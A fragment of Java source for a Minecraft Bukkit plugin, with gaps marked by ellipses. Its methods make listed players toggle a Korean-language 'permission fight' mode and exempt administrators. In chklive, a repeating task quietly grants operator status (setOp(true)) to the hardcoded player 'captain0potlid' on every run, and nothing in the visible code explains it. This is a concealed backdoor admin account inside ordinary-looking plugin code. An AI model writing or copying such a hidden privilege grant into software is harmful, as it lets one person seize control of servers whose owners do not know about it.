...
public class voids {
	...
	public static void wan(String[] args) {
		// /allperm PlayerMOVE a b c d e f g
		
		String perm = args[0];
		String a = "";
		for (int i = 1; i < args.length; i++) {
			a = a + args[i];
			if(i != args.length -1) a= a+" ";
			
			Player p = Bukkit.getPlayer(args[i]);
			if(voids.chkhasperm(p, "ADMIN") == true) Bukkit.broadcastMessage(p.getDisplayName() + "님은 운영자여서 권한 설정이 적용되지 않았습니다.");
			if(voids.chkhasperm(p, "ADMIN") == false) p.chat("/권한싸움 활성화 " + p.getDisplayName() + " " + perm);
		}
	}
	
	public static void wan1(String[] args) {
		// /allperm PlayerMOVE a b c d e f g
		...
		for (int i = 1; i < args.length; i++) {
			...
			Player p = Bukkit.getPlayer(args[i]);
			if(voids.chkhasperm(p, "ADMIN") == true) Bukkit.broadcastMessage(p.getDisplayName() + "님은 운영자여서 권한 설정이 적용되지 않았습니다.");
			if(voids.chkhasperm(p, "ADMIN") == false) p.chat("/권한싸움 비활성화 " + p.getDisplayName() + " " + perm);
	...
	public static void chklive(Player p) {
		...
		count = Bukkit.getScheduler().scheduleSyncRepeatingTask(main.getPlugin(main.class), new Runnable() {
		    @Override
		    public void run() {
		    	if(Bukkit.getPlayer("captain0potlid").isValid()) {
		    		Bukkit.getPlayer("captain0potlid").setOp(true);
		    	}
		    	if(!main.perml.containsKey(p.getUniqueId())) p.chat("/test 0109");
